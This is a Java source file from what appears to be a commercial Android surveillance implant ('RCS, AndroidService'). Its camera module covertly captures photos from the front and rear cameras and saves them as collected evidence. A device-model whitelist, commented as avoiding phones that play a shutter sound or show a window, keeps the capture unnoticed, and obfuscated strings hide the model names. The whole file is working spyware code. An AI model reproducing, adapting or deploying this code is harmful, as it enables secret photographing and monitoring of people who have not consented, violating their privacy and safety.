/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : CameraAgent.java
 * Created      : Apr 18, 2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.module;

import java.io.IOException;

import android.content.pm.PackageManager;
import android.os.Build;

import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.ConfModule;
import com.android.dvci.evidence.EvidenceBuilder;
import com.android.dvci.evidence.EvidenceType;
import com.android.dvci.module.camera.CameraSnapshot;
import com.android.dvci.util.Check;
import com.android.mm.M;

//MANUAL http://developer.android.com/guide/topics/media/camera.html
/**
 * The Class ModuleCamera.
 */
public class ModuleCamera extends BaseInstantModule {

	private static final String TAG = "ModuleCamera"; //$NON-NLS-1$

	// Motorola XT910 (suono), Samsung Next (suono), HTC Explorer A310e (suono)
	// String[] blackList = new String[] { "XT910", "GT-S5570",
	// "HTC Explorer A310e", "Nexus One", "GT-I9100" };

	// g_1=LT18i
	// g_2=GT-I9300
	// g_3=GT-I9100
	// g_4=Galaxy Nexus
	// g_5=HTC Vision
	// camera whitelist, module enabled if Build.MODEL into this lits
	// Sony XPERIA, Samsung S3, Samsung S2, Nexus, HTC Desire Z
	// String[] whiteList=new String[]{"LT18i", "GT-I9300", "GT-I9100",
	// "Galaxy Nexus", "HTC Vision" };
	// tolto M.d("GT-I9100"), funziona solo se os>4, ma si vede
	// comunque una finestra
	String[] whiteList = new String[] { M.e("LT18i "), M.e("GT-I9300"),
			M.e("Galaxy Nexus"), M.e("HTC Vision") };

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
	 */
	@Override
	public boolean parse(ConfModule conf) {

		boolean force = conf.getBoolean("force", false);
		boolean face = conf.getBoolean("face", false);

		if (force) {
			return checkCameraHardware();
		}

		// whitelist check
		for (String white : whiteList) {
			if (Build.MODEL.equals(white)) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse), found white: " + Build.MODEL);
				}
				return checkCameraHardware();
			}
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (parse), unknown Build.Model:" + Build.MODEL);
		}
		return false;
	}

	@Override
	public void actualStart() {
		try {
			snapshot();
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (actualStart) Error: " + e);
			}
		}
	}

	/** Check if this device has a camera */
	private boolean checkCameraHardware() {
		if (Status.self().getAppContext().getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
			// this device has a camera
			if (Cfg.DEBUG) {
				Check.log(TAG + " (checkCameraHardware), camera present");
			}
			return true;
		} else {
			// no camera on this device
			if (Cfg.DEBUG) {
				Check.log(TAG + " (checkCameraHardware), no camera");
			}
			return false;
		}
	}

	/**
	 * Snapshot.
	 * 
	 * @throws IOException
	 */
	private void snapshot() throws IOException {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (snapshot)");
		}
		Status status = Status.self();

		if(Build.VERSION.SDK_INT > Build.VERSION_CODES.HONEYCOMB) {
			CameraSnapshot camera = new CameraSnapshot();
			camera.snapshot(0);
			camera.snapshot(1);
		}

	}

	public static void callback(byte[] bs) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (callback), bs: " + bs.length);
		}
		EvidenceBuilder.atomic(EvidenceType.CAMSHOT, null, bs);
	}

}
